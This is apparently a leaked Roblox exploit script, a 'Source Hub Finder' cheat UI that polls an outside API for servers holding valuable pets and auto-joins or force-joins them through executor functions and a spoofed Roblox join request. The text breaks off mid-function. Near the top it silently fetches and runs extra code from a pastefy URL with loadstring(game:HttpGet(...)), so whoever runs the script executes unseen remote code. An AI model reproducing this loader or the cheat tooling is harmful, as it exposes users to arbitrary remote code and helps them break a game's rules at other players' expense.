-- this was leaked by Pengu With help from SL
--  https://discord.gg/zNyHGU6eUK
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local runtimeContext = {
    credit = "this was leaked by Pengu With help from SL",
    server = "https://discord.gg/zNyHGU6eUK",
    apiBase = "https://agent-6add5ce24b2b3f4e2a3--global-pet-finder-api.netlify.app",
    extraScript = "https://pastefy.app/TY2o2oka/raw",
    title = "Source Hub Finder",
    author = "Sources Hub Team",
    discord = "https://discord.gg/REbuVnr4qt",
    defaultRarity = "Secret",
}

task.spawn(function()
    local ok, err = pcall(function()
        loadstring(game:HttpGet(runtimeContext.extraScript))()
    end)
    if not ok then
        warn("[Source Hub Finder] Gagal load script tambahan:", err)
    end
end)

local API_BASE = runtimeContext.apiBase
local GET_PETS_URL = API_BASE .. "/api/getPets"
local POLL_INTERVAL = 1
local MAX_FEED_ITEMS = 300
local DEFAULT_RARITY = runtimeContext.defaultRarity
local FORCE_JOIN_RETRY_DELAY = 3
local APP_TITLE = runtimeContext.title
local APP_AUTHOR = runtimeContext.author
local DISCORD_LINK = runtimeContext.discord
local ADD_PET_URL = API_BASE .. "/api/addPet"
local REMOVE_PET_URL = API_BASE .. "/api/removePet"
local SYNC_PETS_URL = API_BASE .. "/api/syncPets"
local POST_ENABLED = true
local MIN_PET_VALUE = 50000000
local SCAN_INTERVAL = 8

local petRarityMap = {}
local petRarityColorMap = {}
local petDisplayNameMap = {}
local petIconMap = {}

local function extractIconId(assetEntry)
    for _, key in ipairs({ "Icon", "IconId", "Image", "ImageId", "Thumbnail" }) do
        local val = assetEntry[key]
        if val ~= nil then
            local id = tostring(val):match("(%d%d%d%d%d+)")
            if id then
                return id
            end
        end
    end
    return nil
end

local assetsOk, assetsErr = pcall(function()
    local Assets = require(ReplicatedStorage:WaitForChild("Data", 5):WaitForChild("Assets", 5))
    for key, data in pairs(Assets.Directory) do
        if type(data) == "table" and type(data.Rarity) == "table" then
            local rarityName = data.Rarity.DisplayName or data.Rarity._id
            local iconId = extractIconId(data)

            petRarityMap[key] = rarityName
            petRarityColorMap[key] = data.Rarity.Color
            petDisplayNameMap[key] = data.DisplayName or tostring(key)
            petIconMap[key] = iconId

            if data.DisplayName then
                petRarityMap[data.DisplayName] = rarityName
                petRarityColorMap[data.DisplayName] = data.Rarity.Color
                petDisplayNameMap[data.DisplayName] = data.DisplayName
                petIconMap[data.DisplayName] = iconId
            end
        end
    end
end)

if not assetsOk then
    warn("[Source Hub Finder] Gagal load Assets:", assetsErr)
end

local function getPetRarity(petName)
    return petRarityMap[petName]
end

local function getPetRarityColor(petName)
    local color = petRarityColorMap[petName]
    if typeof(color) == "Color3" then
        return color
    end
    return nil
end

-- this was leaked by Pengu With help from SL
--  https://discord.gg/zNyHGU6eUK
local themePalette = {
    notice = "this was leaked by Pengu With help from SL",
    community = "https://discord.gg/zNyHGU6eUK",
    white = Color3.fromRGB(255, 255, 255),
    accentLight = Color3.fromRGB(255, 70, 80),
    accent = Color3.fromRGB(235, 35, 50),
    accentDark = Color3.fromRGB(120, 10, 22),
    accentDeep = Color3.fromRGB(60, 6, 12),
    textSub = Color3.fromRGB(175, 150, 152),
    textMuted = Color3.fromRGB(130, 95, 98),
}

local COLOR_WHITE = themePalette.white
local COLOR_ACCENT_LIGHT = themePalette.accentLight
local COLOR_ACCENT = themePalette.accent
local COLOR_ACCENT_DARK = themePalette.accentDark
local COLOR_ACCENT_DEEP = themePalette.accentDeep
local COLOR_TEXT_SUB = themePalette.textSub
local COLOR_TEXT_MUTED = themePalette.textMuted

local FONT_BOLD = Enum.Font.GothamBold
local FONT_MEDIUM = Enum.Font.GothamMedium

local function createInstance(className, props, parent)
    if themePalette.notice ~= runtimeContext.credit or themePalette.community ~= runtimeContext.server then
        return nil
    end
    local inst = Instance.new(className)
    for k, v in pairs(props) do
        inst[k] = v
    end
    if parent then
        inst.Parent = parent
    end
    return inst
end

local function addCorner(parent, radius)
    return createInstance("UICorner", {
        CornerRadius = UDim.new(0, radius),
    }, parent)
end

local function addStroke(parent, color, thickness, transparency)
    return createInstance("UIStroke", {
        Color = color,
        Thickness = thickness or 1,
        Transparency = transparency or 0,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
    }, parent)
end

local function addGradient(parent, c0, c1, rotation)
    return createInstance("UIGradient", {
        Color = ColorSequence.new(c0, c1),
        Rotation = rotation or 0,
    }, parent)
end

local function addAccentStroke(parent, thickness, transparency)
    local stroke = addStroke(parent, COLOR_WHITE, thickness, transparency)
    addGradient(stroke, COLOR_ACCENT_LIGHT, COLOR_ACCENT_DARK, 90)
    return stroke
end

local function createLabel(parent, text, textSize, font, textColor, position, size, xAlign)
    return createInstance("TextLabel", {
        BackgroundTransparency = 1,
        Text = text,
        TextSize = textSize,
        Font = font,
        TextColor3 = textColor,
        Position = position,
        Size = size,
        TextXAlignment = xAlign or Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Center,
    }, parent)
end

local function createStyledButton(parent, opts)
    local frame = createInstance("Frame", {
        AnchorPoint = opts.anchor or Vector2.new(0, 0),
        Position = opts.pos,
        Size = opts.size,
        BackgroundColor3 = COLOR_WHITE,
        BackgroundTransparency = opts.bgTransparency or 0,
        BorderSizePixel = 0,
    }, parent)

    addCorner(frame, opts.radius or 8)
    addGradient(frame, opts.c0, opts.c1, opts.rotation or 90)

    if opts.strokeColor then
        addStroke(frame, opts.strokeColor, opts.strokeThickness or 1.2, opts.strokeTransparency or 0)
    end

    local btn = createInstance("TextButton", {
        AutoButtonColor = false,
        Size = UDim2.fromScale(1, 1),
        BackgroundTransparency = 1,
        Text = opts.text,
        TextSize = opts.textSize or 12,
        Font = FONT_BOLD,
        TextColor3 = opts.textColor or COLOR_WHITE,
        BorderSizePixel = 0,
    }, frame)

    return btn, frame
end

local function formatMoneyPerSec(value)
    local tiers = {
        { 1000000000000, "T" },
        { 1000000000, "B" },
        { 1000000, "M" },
        { 1000, "K" },
    }
    for _, tier in ipairs(tiers) do
        if value >= tier[1] then
            return ("$%.1f%s/s"):format(value / tier[1], tier[2])
        end
    end
    return ("$%d/s"):format(math.floor(value))
end

local function formatElapsed(timestampMs)
    local elapsed = math.max(0, math.floor(os.time() - timestampMs / 1000))
    return ("%d:%02d"):format(math.floor(elapsed / 60), elapsed % 60)
end

local function color3ToRgbString(color)
    return ("rgb(%d,%d,%d)"):format(
        math.floor(color.R * 255 + 0.5),
        math.floor(color.G * 255 + 0.5),
        math.floor(color.B * 255 + 0.5)
    )
end

local function escapeRichText(str)
    return tostring(str):gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")
end

local function httpGet(url)
    local ok, res = pcall(function()
        local reqFn = syn and syn.request or http_request or request
        if reqFn then
            return reqFn({
                Url = url,
                Method = "GET",
            })
        end
        return nil
    end)
    if ok and res and res.Body then
        return res.Body
    end

    local ok2, body2 = pcall(function()
        return game:HttpGet(url)
    end)
    if ok2 and body2 then
        return body2
    end

    local ok3, body3 = pcall(function()
        return HttpService:GetAsync(url)
    end)
    if ok3 then
        return body3
    end

    return nil
end

local function httpPostJson(url, jsonBody)
    local reqFn = syn and syn.request or http_request or request
    if not reqFn then
        return nil, "no request fn"
    end

    local ok, res = pcall(reqFn, {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = jsonBody,
    })

    if ok and type(res) == "table" then
        return tonumber(res.StatusCode), res.Body
    end
    return nil, tostring(res)
end

-- this was leaked by Pengu With help from SL
--  https://discord.gg/zNyHGU6eUK
local interfaceBounds = {
    origin = "this was leaked by Pengu With help from SL",
    channel = "https://discord.gg/zNyHGU6eUK",
    minW = 640,
    maxW = 800,
    minH = 300,
    maxH = 502,
    margin = 8,
}

local screenGui = createInstance("ScreenGui", {
    Name = "SourceHubFinder",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    IgnoreGuiInset = true,
}, PlayerGui)

local mainFrame = createInstance("Frame", {
    Name = "Main",
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.fromOffset(interfaceBounds.maxW, interfaceBounds.maxH),
    BackgroundColor3 = COLOR_WHITE,
    BackgroundTransparency = 0.06,
    BorderSizePixel = 0,
    ClipsDescendants = true,
}, screenGui)

addCorner(mainFrame, 14)
addAccentStroke(mainFrame, 1.6, 0)

createInstance("UIGradient", {
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(52, 8, 16)),
        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(14, 8, 10)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 4, 5)),
    }),
    Rotation = 35,
}, mainFrame)

local uiScale = createInstance("UIScale", {
    Scale = 1,
}, mainFrame)

do
    local isDragging = nil
    local dragStartPos = nil
    local frameStartPos = nil

    mainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            dragStartPos = input.Position
            frameStartPos = mainFrame.Position
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStartPos
            mainFrame.Position = UDim2.new(
                frameStartPos.X.Scale,
                frameStartPos.X.Offset + delta.X,
                frameStartPos.Y.Scale,
                frameStartPos.Y.Offset + delta.Y
            )
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = false
        end
    end)
end

local sidebar = createInstance("Frame", {
    Name = "Sidebar",
    Size = UDim2.new(0, 160, 1, 0),
    BackgroundColor3 = COLOR_WHITE,
    BackgroundTransparency = 0.15,
    BorderSizePixel = 0,
}, mainFrame)

addGradient(sidebar, Color3.fromRGB(8, 6, 7), Color3.fromRGB(58, 8, 17), 90)

local sidebarDivider = createInstance("Frame", {
    AnchorPoint = Vector2.new(1, 0),
    Position = UDim2.new(1, 0, 0, 0),
    Size = UDim2.new(0, 1, 1, 0),
    BackgroundColor3 = COLOR_WHITE,
    BorderSizePixel = 0,
}, sidebar)

addGradient(sidebarDivider, COLOR_ACCENT_LIGHT, COLOR_ACCENT_DARK, 90)

local titleLabel = createLabel(
    sidebar,
    APP_TITLE,
    13,
    FONT_BOLD,
    COLOR_WHITE,
    UDim2.fromOffset(12, 20),
    UDim2.fromOffset(146, 20)
)
addGradient(titleLabel, COLOR_WHITE, COLOR_ACCENT_LIGHT, 0)

createInstance("Frame", {
    Position = UDim2.fromOffset(16, 56),
    Size = UDim2.fromOffset(6, 6),
    BackgroundColor3 = COLOR_ACCENT_LIGHT,
    BorderSizePixel = 0,
}, sidebar)

local statusLabel = createLabel(
    sidebar,
    "Connecting...",
    9,
    FONT_MEDIUM,
    COLOR_TEXT_SUB,
    UDim2.fromOffset(28, 51),
    UDim2.fromOffset(110, 16)
)

createStyledButton(sidebar, {
    text = "Logs",
    textSize = 12,
    pos = UDim2.fromOffset(8, 70),
    size = UDim2.fromOffset(146, 38),
    c0 = COLOR_ACCENT,
    c1 = COLOR_ACCENT_DARK,
    rotation = 0,
    strokeColor = COLOR_ACCENT_LIGHT,
    strokeTransparency = 0.1,
    radius = 10,
})

local authorLabel = createLabel(
    sidebar,
    "Author: " .. APP_AUTHOR,
    10,
    FONT_BOLD,
    COLOR_TEXT_SUB,
    UDim2.fromOffset(12, 118),
    UDim2.fromOffset(142, 18)
)
addGradient(authorLabel, COLOR_WHITE, COLOR_ACCENT_LIGHT, 0)

local copyDefaultText = "Copy Discord Link"
local copyDiscordBtn = createStyledButton(sidebar, {
    text = copyDefaultText,
    textSize = 10,
    pos = UDim2.fromOffset(8, 142),
    size = UDim2.fromOffset(146, 30),
    c0 = Color3.fromRGB(44, 10, 15),
    c1 = Color3.fromRGB(14, 8, 9),
    strokeColor = COLOR_ACCENT,
    strokeTransparency = 0.25,
    radius = 10,
})

local copyClickSeq = 0
copyDiscordBtn.MouseButton1Click:Connect(function()
    local clipFn = setclipboard or toclipboard
    local copied = clipFn and pcall(clipFn, DISCORD_LINK)
    copyClickSeq = copyClickSeq + 1
    local mySeq = copyClickSeq

    copyDiscordBtn.Text = copied and "Copied!" or "Copy failed"
    if not copied then
        warn("[" .. APP_TITLE .. "] Clipboard tidak didukung executor. Link: " .. DISCORD_LINK)
    end

    task.delay(1.5, function()
        if copyClickSeq == mySeq and copyDiscordBtn.Parent then
            copyDiscordBtn.Text = copyDefaultText
        end
    end)
end)

local scanPostLabel = createLabel(
    sidebar,
    "Scan:0 Post:0",
    9,
    FONT_MEDIUM,
    COLOR_TEXT_MUTED,
    UDim2.fromOffset(12, 178),
    UDim2.fromOffset(142, 14)
)
scanPostLabel.TextTruncate = Enum.TextTruncate.AtEnd

local MIN_WIDTH = interfaceBounds.minW
local MAX_WIDTH = interfaceBounds.maxW
local MIN_HEIGHT = interfaceBounds.minH
local MAX_HEIGHT = interfaceBounds.maxH
local VIEWPORT_MARGIN = interfaceBounds.margin
local userScale = 1

local scaleMinusBtn = createStyledButton(sidebar, {
    text = "-",
    textSize = 16,
    anchor = Vector2.new(0, 1),
    pos = UDim2.new(0, 8, 1, -67),
    size = UDim2.fromOffset(40, 28),
    c0 = Color3.fromRGB(44, 10, 15),
    c1 = Color3.fromRGB(14, 8, 9),
    strokeColor = COLOR_ACCENT,
    strokeTransparency = 0.25,
    radius = 8,
})

local scaleValueLabel = createLabel(
    sidebar,
    "100%",
    10,
    FONT_BOLD,
    COLOR_WHITE,
    UDim2.new(0, 52, 1, -95),
    UDim2.fromOffset(58, 28),
    Enum.TextXAlignment.Center
)

local scalePlusBtn = createStyledButton(sidebar, {
    text = "+",
    textSize = 16,
    anchor = Vector2.new(0, 1),
    pos = UDim2.new(0, 114, 1, -67),
    size = UDim2.fromOffset(40, 28),
    c0 = Color3.fromRGB(44, 10, 15),
    c1 = Color3.fromRGB(14, 8, 9),
    strokeColor = COLOR_ACCENT,
    strokeTransparency = 0.25,
    radius = 8,
})

local function updateLayoutScale()
    local absSize = screenGui.AbsoluteSize
    if absSize.X <= 0 or absSize.Y <= 0 or interfaceBounds.origin ~= runtimeContext.credit then
        return
    end

    local maxFitScale = math.min(
        (absSize.X - VIEWPORT_MARGIN * 2) / MIN_WIDTH,
        (absSize.Y - VIEWPORT_MARGIN * 2) / MIN_HEIGHT
    )
    local effectiveScale = math.max(0.3, math.min(userScale, maxFitScale))
    uiScale.Scale = effectiveScale

    mainFrame.Size = UDim2.fromOffset(
        math.clamp((absSize.X - VIEWPORT_MARGIN * 2) / effectiveScale, MIN_WIDTH, MAX_WIDTH),
        math.clamp((absSize.Y - VIEWPORT_MARGIN * 2) / effectiveScale, MIN_HEIGHT, MAX_HEIGHT)
    )
    scaleValueLabel.Text = math.floor(effectiveScale * 100 + 0.5) .. "%"
end

local function adjustScale(delta)
    userScale = math.clamp(math.floor((uiScale.Scale + delta) * 10 + 0.5) / 10, 0.4, 1.6)
    updateLayoutScale()
end

scaleMinusBtn.MouseButton1Click:Connect(function()
    adjustScale(-0.1)
end)

scalePlusBtn.MouseButton1Click:Connect(function()
    adjustScale(0.1)
end)

screenGui:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateLayoutScale)
updateLayoutScale()

local hideBtn = createStyledButton(sidebar, {
    text = "Hide",
    textSize = 12,
    anchor = Vector2.new(0, 1),
    pos = UDim2.new(0, 11, 1, -23),
    size = UDim2.fromOffset(138, 36),
    c0 = Color3.fromRGB(44, 10, 15),
    c1 = Color3.fromRGB(14, 8, 9),
    strokeColor = COLOR_ACCENT,
    strokeTransparency = 0.25,
    radius = 10,
})

local showBtn, showFrame = createStyledButton(screenGui, {
    text = APP_TITLE,
    textSize = 12,
    anchor = Vector2.new(0.5, 0),
    pos = UDim2.new(0.5, 0, 0, 12),
    size = UDim2.fromOffset(150, 30),
    c0 = Color3.fromRGB(60, 10, 17),
    c1 = Color3.fromRGB(12, 8, 9),
    strokeColor = COLOR_ACCENT,
    strokeTransparency = 0.15,
    radius = 10,
})
showFrame.Visible = false

hideBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
    showFrame.Visible = true
end)

showBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = true
    showFrame.Visible = false
end)

local contentFrame = createInstance("Frame", {
    Name = "Content",
    Position = UDim2.fromOffset(182, 0),
    Size = UDim2.new(1, -182, 1, 0),
    BackgroundTransparency = 1,
}, mainFrame)

local TOGGLE_OFF_COLOR = Color3.fromRGB(38, 24, 26)

local function createToggleCard(labelText, xMode, onToggle)
    local card = createInstance("Frame", {
        Position = xMode == 0 and UDim2.new(0, 0, 0, 20) or UDim2.new(0.5, 6, 0, 20),
        Size = xMode == 0 and UDim2.new(0.5, -6, 0, 46) or UDim2.new(0.5, -24, 0, 46),
        BackgroundColor3 = COLOR_WHITE,
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0,
    }, contentFrame)

    addCorner(card, 10)
    addGradient(card, Color3.fromRGB(46, 9, 15), Color3.fromRGB(12, 9, 10), 0)
    addAccentStroke(card, 1.2, 0.2)

    createLabel(
        card,
        labelText,
        12,
        FONT_BOLD,
        COLOR_WHITE,
        UDim2.fromOffset(14, 0),
        UDim2.new(1, -90, 1, 0)
    )

    local switchBtn = createInstance("TextButton", {
        AutoButtonColor = false,
        Text = "",
        AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -12, 0.5, 0),
        Size = UDim2.fromOffset(48, 26),
        BackgroundColor3 = TOGGLE_OFF_COLOR,
        BorderSizePixel = 0,
    }, card)

    addCorner(switchBtn, 13)
    addStroke(switchBtn, COLOR_ACCENT_DARK, 1, 0.2)
    addGradient(switchBtn, COLOR_WHITE, Color3.fromRGB(165, 165, 165), 90)

    local knob = createInstance("Frame", {
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, 4, 0.5, 0),
        Size = UDim2.fromOffset(20, 20),
        BackgroundColor3 = COLOR_WHITE,
        BorderSizePixel = 0,
    }, switchBtn)

    addCorner(knob, 10)

    local state = false
    local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    switchBtn.MouseButton1Click:Connect(function()
        state = not state
        TweenService:Create(knob, tweenInfo, {
            Position = state and UDim2.new(1, -24, 0.5, 0) or UDim2.new(0, 4, 0.5, 0),
        }):Play()
        TweenService:Create(switchBtn, tweenInfo, {
            BackgroundColor3 = state and COLOR_ACCENT or TOGGLE_OFF_COLOR,
        }):Play()
        if onToggle then
            onToggle(state)
        end
    end)

    return card
end

local autoJoinEnabled = false
local autoForceEnabled = false
local lastAutoJoinedJobId = nil
local activeForceKey = nil
local activeForceJobId = nil
local forceSessionId = 0
local renderFeed = nil
local startForceJoinLoop = nil
local stopForceJoinLoop = nil

createToggleCard("Auto-Join", 0, function(enabled)
    autoJoinEnabled = enabled
    renderFeed()
end)

createToggleCard("Auto-Force", 311, function(enabled)
    autoForceEnabled = enabled
    if not enabled then
        stopForceJoinLoop()
    end
    renderFeed()
end)

createLabel(
    contentFrame,
    "LIVE FEED",
    9,
    FONT_BOLD,
    COLOR_ACCENT_LIGHT,
    UDim2.fromOffset(2, 74),
    UDim2.fromOffset(100, 16)
)

local detectedCountLabel = createLabel(
    contentFrame,
    "0 detected",
    8,
    FONT_MEDIUM,
    COLOR_TEXT_MUTED,
    UDim2.new(1, -98, 0, 74),
    UDim2.fromOffset(80, 16),
    Enum.TextXAlignment.Right
)
detectedCountLabel.AnchorPoint = Vector2.new(1, 0)

local clearBtn = createStyledButton(contentFrame, {
    text = "Clear",
    textSize = 9,
    anchor = Vector2.new(1, 0),
    pos = UDim2.new(1, -18, 0, 70),
    size = UDim2.fromOffset(49, 22),
    c0 = COLOR_ACCENT_DARK,
    c1 = COLOR_ACCENT_DEEP,
    strokeColor = COLOR_ACCENT,
    strokeThickness = 1,
    strokeTransparency = 0.4,
})

local feedContainer = createInstance("Frame", {
    Position = UDim2.fromOffset(0, 96),
    Size = UDim2.new(1, -2, 1, -112),
    BackgroundColor3 = COLOR_WHITE,
    BackgroundTransparency = 0.2,
    BorderSizePixel = 0,
}, contentFrame)

addCorner(feedContainer, 12)
addGradient(feedContainer, Color3.fromRGB(16, 6, 8), Color3.fromRGB(5, 5, 6), 90)
addStroke(feedContainer, COLOR_ACCENT, 1, 0.6)

local scrollingFrame = createInstance("ScrollingFrame", {
    Position = UDim2.fromOffset(7, 7),
    Size = UDim2.new(1, -14, 1, -14),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = COLOR_ACCENT,
    CanvasSize = UDim2.new(0, 0, 0, 0),
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
}, feedContainer)

createInstance("UIListLayout", {
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder,
}, scrollingFrame)

createInstance("UIPadding", {
    PaddingRight = UDim.new(0, 8),
}, scrollingFrame)

-- this was leaked by Pengu With help from SL
--  https://discord.gg/zNyHGU6eUK
local sessionRouter = {
    tag = "this was leaked by Pengu With help from SL",
    inviteUrl = "https://discord.gg/zNyHGU6eUK",
    joinEndpoint = "https://gamejoin.roblox.com/v1/join-game-instance",
    userAgent = "Roblox/WinInet",
    cardHeight = 60,
}

TeleportService.TeleportInitFailed:Connect(function(_, teleportResult, errorMessage)
    warn("[" .. APP_TITLE .. "] TeleportInitFailed:", tostring(teleportResult), tostring(errorMessage))
    if statusLabel and statusLabel.Parent then
        statusLabel.Text = "Join failed"
    end
end)

local function joinServerInstance(jobId)
    if sessionRouter.tag ~= interfaceBounds.origin or sessionRouter.inviteUrl ~= interfaceBounds.channel then
        return
    end
    jobId = tostring(jobId or "")
    if jobId == "" or jobId == "nil" then
        warn("[" .. APP_TITLE .. "] Join failed: empty jobId")
        return
    end
    if jobId == tostring(game.JobId) then
        warn("[" .. APP_TITLE .. "] Already in this server")
        return
    end

    local placeId = game.PlaceId
    statusLabel.Text = "Joining..."

    local ok, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
    end)
    if ok then
        return
    end

    ok, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, jobId)
    end)
    if ok then
        return
    end

    local reqFn = syn and syn.request or http_request or request
    if reqFn then
        ok, err = pcall(function()
            reqFn({
                Url = sessionRouter.joinEndpoint,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = sessionRouter.userAgent,
                },
                Body = HttpService:JSONEncode({
                    placeId = placeId,
                    gameId = jobId,
                }),
            })
        end)
        if ok then
            pcall(function()
                TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
            end)
            return
        end
    end

    statusLabel.Text = "Join failed"
end

stopForceJoinLoop = function()
    forceSessionId = forceSessionId + 1
    activeForceKey, activeForceJobId = nil, nil
end

startForceJoinLoop = function(entryKey, jobId)
    forceSessionId = forceSessionId + 1
    local mySession = forceSessionId
    activeForceKey = entryKey
    activeForceJobId = jobId

    task.spawn(function()
        while forceSessionId == mySession and autoForceEnabled and screenGui.Parent do
            if jobId == game.JobId then
                stopForceJoinLoop()
                renderFeed()
                break
            end
            joinServerInstance(jobId)
            task.wait(FORCE_JOIN_RETRY_DELAY)
        end
    end)
end

local activeTimeLabels = {}

local function clearFeedCards()
    for _, child in ipairs(scrollingFrame:GetChildren()) do
        if child:IsA("Frame") then
            child:Destroy()
        end
    end
    table.clear(activeTimeLabels)
end

local function formatSubtitleText(entry)
    local parts = {}
    table.insert(parts, formatElapsed(entry.ts))

    local rarityStr = escapeRichText(entry.rarity)
    if entry.rarityColor then
        rarityStr = ('<font color="%s">%s</font>'):format(color3ToRgbString(entry.rarityColor), rarityStr)
    end
    table.insert(parts, rarityStr)

    return table.concat(parts, " • ")
end

local function createPetCard(entry, layoutOrder)
    local card = createInstance("Frame", {
        LayoutOrder = layoutOrder,
        Size = UDim2.new(1, 0, 0, sessionRouter.cardHeight),
        BackgroundColor3 = COLOR_WHITE,
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0,
    }, scrollingFrame)

    addCorner(card, 10)
    addGradient(card, Color3.fromRGB(58, 10, 17), Color3.fromRGB(15, 11, 12), 0)
    addAccentStroke(card, 1, 0.5)

    local sideBarBar = createInstance("Frame", {
        Position = UDim2.fromOffset(6, 6),
        Size = UDim2.fromOffset(6, 48),
        BackgroundColor3 = COLOR_WHITE,
        BorderSizePixel = 0,
    }, card)
    addCorner(sideBarBar, 3)
    addGradient(sideBarBar, COLOR_ACCENT_LIGHT, COLOR_ACCENT_DARK, 90)

    createInstance("ImageLabel", {
        Position = UDim2.fromOffset(20, 8),
        Size = UDim2.fromOffset(44, 44),
        BackgroundTransparency = 1,
        Image = entry.iconId and ("rbxassetid://" .. tostring(entry.iconId)) or "",
        ScaleType = Enum.ScaleType.Fit,
    }, card)

    local nameLabel = createLabel(
        card,
        "",
        18,
        FONT_BOLD,
        COLOR_WHITE,
        UDim2.fromOffset(71, 7),
        UDim2.new(1, -220, 0, 26)
    )
    nameLabel.RichText = true
    nameLabel.TextScaled = true

    createInstance("UITextSizeConstraint", {
        MaxTextSize = 18,
        MinTextSize = 9,
    }, nameLabel)

    nameLabel.Text = ('%s  <font color="rgb(255,70,80)">[ %s ]</font>'):format(
        escapeRichText(entry.name),
        formatMoneyPerSec(entry.value)
    )

    local subLabel = createLabel(
        card,
        "",
        11,
        FONT_BOLD,
        COLOR_TEXT_SUB,
        UDim2.fromOffset(71, 33),
        UDim2.new(1, -220, 0, 16)
    )
    subLabel.RichText = true
    subLabel.TextTruncate = Enum.TextTruncate.AtEnd
    subLabel.Text = formatSubtitleText(entry)

    table.insert(activeTimeLabels, {
        label = subLabel,
        entry = entry,
    })

    local joinBtn = createStyledButton(card, {
        text = "JOIN",
        textSize = 8,
        anchor = Vector2.new(1, 0.5),
        pos = UDim2.new(1, -78, 0.5, 0),
        size = UDim2.fromOffset(48, 26),
        c0 = COLOR_ACCENT,
        c1 = COLOR_ACCENT_DARK,
        strokeColor = COLOR_ACCENT_LIGHT,
        strokeTransparency = 0.2,
    })

    local isForcingThis = autoForceEnabled and (activeForceKey == entry.key)
    local forceC0, forceC1, forceTextColor, forceStrokeColor, forceStrokeTrans

    if isForcingThis then
        forceC0, forceC1, forceTextColor = COLOR_ACCENT_LIGHT, COLOR_ACCENT, COLOR_WHITE
        forceStrokeColor, forceStrokeTrans = COLOR_WHITE, 0.3
    elseif autoForceEnabled then
        forceC0 = Color3.fromRGB(44, 11, 16)
        forceC1 = Color3.fromRGB(16, 9, 10)
        forceTextColor = COLOR_WHITE
        forceStrokeColor, forceStrokeTrans = COLOR_ACCENT, 0.15
    else
        forceC0 = Color3.fromRGB(34, 26, 27)
        forceC1 = Color3.fromRGB(24, 19, 20)
        forceTextColor = Color3.fromRGB(95, 75, 76)
        forceStrokeColor, forceStrokeTrans = nil, nil
    end

    local forceBtn = createStyledButton(card, {
        text = "FORCE",
        textSize = 8,
        textColor = forceTextColor,
        anchor = Vector2.new(1, 0.5),
        pos = UDim2.new(1, -12, 0.5, 0),
        size = UDim2.fromOffset(44, 26),
        c0 = forceC0,
        c1 = forceC1,
        strokeColor = forceStrokeColor,
        strokeTransparency = forceStrokeTrans,
    })

    joinBtn.MouseButton1Click:Connect(function()
        joinServerInstance(entry.jobId)
    end)

    forceBtn.MouseButton1Click:Connect(function()
        if not autoForceEnabled then
            return
        end
        if activeForceKey == entry.key then
            stopForceJoinLoop()
        else
            startForceJoinLoop(entry.key, entry.jobId)
        end
        renderFeed()
    end)
end

local clearedKeys = {}
local currentPetsList = {}

local function getEntryKey(entry)
    return entry.jobId .. "|" .. entry.name .. "|" .. tostring(entry.ts)
end

renderFeed = function()
    local savedScroll = scrollingFrame.CanvasPosition
    clearFeedCards()

    local count = 0
    for _, entry in ipairs(currentPetsList) do
        if not clearedKeys[getEntryKey(entry)] then
            count = count + 1
            if count <= MAX_FEED_ITEMS then
                createPetCard(entry, count)
            end
        end
    end

    detectedCountLabel.Text = count .. " detected"
    scrollingFrame.CanvasPosition = savedScroll

    if autoJoinEnabled and #currentPetsList > 0 then
        for _, entry in ipairs(currentPetsList) do
            local jid = tostring(entry.jobId)
            if not clearedKeys[getEntryKey(entry)] and jid ~= tostring(game.JobId) and jid ~= lastAutoJoinedJobId then
                lastAutoJoinedJobId = jid
                joinServerInstance(jid)
                break
            end
        end
    end
end

clearBtn.MouseButton1Click:Connect(function()
    for _, entry in ipairs(currentPetsList) do
        clearedKeys[getEntryKey(entry)] = true
    end
    renderFeed()
end)

-- this was leaked by Pengu With help from SL
--  https://discord.gg/zNyHGU6eUK
local scannerSchema = {
    signature = "this was leaked by Pengu With help from SL",
    discordInvite = "https://discord.gg/zNyHGU6eUK",
    pattern = "^%s*%$?%s*([%d%.,]+)%s*([KkMmBbTt]?)%s*/%s*[sS]%s*$",
    multipliers = {
        K = 1000,
        M = 1000000,
        B = 1000000000,
        T = 1000000000000,
    },
}

local function fetchGlobalPets()
    if scannerSchema.signature ~= sessionRouter.tag or scannerSchema.discordInvite ~= themePalette.community then
        return false
    end
    local body = httpGet(GET_PETS_URL)
    if not body then
        return false
    end

    local ok, decoded = pcall(function()
        return HttpService:JSONDecode(body)
